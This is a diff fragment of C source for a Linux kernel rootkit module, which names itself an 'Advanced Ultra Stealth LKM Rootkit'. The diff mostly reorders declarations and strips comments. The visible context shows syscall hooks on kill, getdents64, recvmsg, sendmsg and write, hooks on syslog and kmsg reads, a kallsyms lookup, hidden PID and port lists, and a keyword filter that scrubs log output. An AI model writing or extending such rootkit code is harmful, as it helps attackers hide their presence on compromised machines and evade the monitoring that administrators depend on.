@@ -47,10 +47,8 @@ MODULE_DESCRIPTION("Advanced Ultra Stealth LKM Rootkit");
 #define MAX_HIDDEN_PORTS 32
 #define TARGET_STRING "deception"
 
-/* --- Configuration State --- */
 static const char *hide_keywords[] = {
     "deception",
-   // "pam_unix(sudo:session)",
     "__x64_sys_kill",
     "__x64_sys_getdents64",
     "__x64_sys_recvmsg",
@@ -72,8 +70,8 @@ struct hidden_pid {
 typedef int (*do_syslog_t)(int type, char __user *buf, int len, int from_file);
 typedef ssize_t (*devkmsg_read_t)(struct file *file, char __user *buf, size_t count, loff_t *ppos);
 
-static do_syslog_t orig_do_syslog;
-static devkmsg_read_t orig_devkmsg_read;
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+typedef int (*kallsyms_on_each_symbol_t)(int (*fn)(void *, const char *, unsigned long), void *data);
 
 static asmlinkage long (*orig_recvmsg)(const struct pt_regs *);
 static asmlinkage long (*orig_sendmsg)(const struct pt_regs *);
@@ -82,15 +80,14 @@ static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *, void *);
 static asmlinkage long (*orig_write)(const struct pt_regs *);
-
-static void filter_buffer(char *kernel_buf, size_t *bytes_read);
 static asmlinkage int fh_do_syslog(int type, char __user *buf, int len, int from_file);
 static asmlinkage ssize_t fh_devkmsg_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);
 
-typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-typedef int (*kallsyms_on_each_symbol_t)(int (*fn)(void *, const char *, unsigned long), void *data);
+static void filter_buffer(char *kernel_buf, size_t *bytes_read);
 
-/* --- Trackers and State Keepers --- */
+static do_syslog_t orig_do_syslog;
+static devkmsg_read_t orig_devkmsg_read;
+
 static struct list_head *prev_module;
 
 static atomic_t module_exiting = ATOMIC_INIT(0);
@@ -102,7 +99,6 @@ static DEFINE_SPINLOCK(ports_lock);
 static LIST_HEAD(hidden_pids_list);
 static DEFINE_SPINLOCK(pids_lock);
 
-/* --- Core String Filter Engine --- */
 static bool buf_has_hide_keyword(const char *kbuf, size_t len)
 {
     size_t i;
@@ -150,12 +146,6 @@ static void filter_buffer(char *kernel_buf, size_t *bytes_read)
 
     *bytes_read = clean_count;
 }
-
-struct sym_search {
-    unsigned long target_ref;
-    unsigned long best_addr;
-    unsigned long best_diff;
-};
 
 static ssize_t (*orig_seq_read_iter)(struct kiocb *iocb, struct iov_iter *iter);
 
@@ -749,7 +739,6 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
     return orig_kill(regs);
 }
 
-/* --- Network Seq Show Hooks (IPv6 only) --- */
 static int hooked_tcp6_seq_show(struct seq_file *seq, void *v)
 {
     int ret;
